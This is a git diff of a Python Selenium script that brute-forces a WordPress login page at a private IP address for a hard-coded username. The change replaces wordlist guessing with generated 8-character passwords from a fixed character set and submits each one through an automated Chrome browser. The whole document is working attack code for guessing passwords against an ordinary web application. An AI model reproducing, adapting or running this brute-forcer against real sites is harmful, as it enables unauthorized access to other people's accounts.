@@ -6,9 +6,10 @@ class Login:
 
     URL = 'http://10.225.147.156/wp-login.php'
     passwordDictionary = []
+    generatedDict = []
     wordlist = open("Wordlists/EncodedWordlist.txt")
-    charList = "abcdefghijklmnopqrstuwxkyz-!"
-    username = "chrisb14"
+    charList = "abcdehilmnopqrstuky"
+    username = "sigurda"
     password = "test"
     websiteDriver = None
     service = None
@@ -16,7 +17,7 @@ class Login:
     def __init__(self):
         self.websiteDriver = webdriver.Chrome()
         self.fileToArrayConverter()
-        #self.generatePasswords()
+        self.generatePasswords()
 
     def fileToArrayConverter(self):
         for word in self.wordlist:
@@ -24,11 +25,18 @@ class Login:
             for newWord in wordconv1:
                 self.passwordDictionary.append(newWord)
 
+    def generatePasswords(self):
+        for current in range(8):
+            self.generatedDict = [i for i in self.charList]
+            for y in range(current):
+                self.generatedDict = [current + i for i in self.charList for current in self.generatedDict]
+
     def bruteForcer(self):
         self.websiteDriver.get(self.URL)
 
-        for password in self.passwordDictionary:
-            if len(password) > 3:
+        for password in self.generatedDict:
+            if len(password) > 7:
+
                 time.sleep(0.2)
                 # Clears the username field so that it does not appear double (happens when the wordpress password is wrong)
                 self.websiteDriver.find_element_by_id("user_login").clear()
@@ -52,12 +60,5 @@ class Login:
 Login().bruteForcer()
 
 
-"""
 
 
-    def generatePasswords(self):
-        for current in range(4):
-            self.passwordDictionary = [i for i in self.charList]
-            for y in range(current):
-                self.passwordDictionary = [current + i for i in self.charList for current in self.passwordDictionary]
-"""
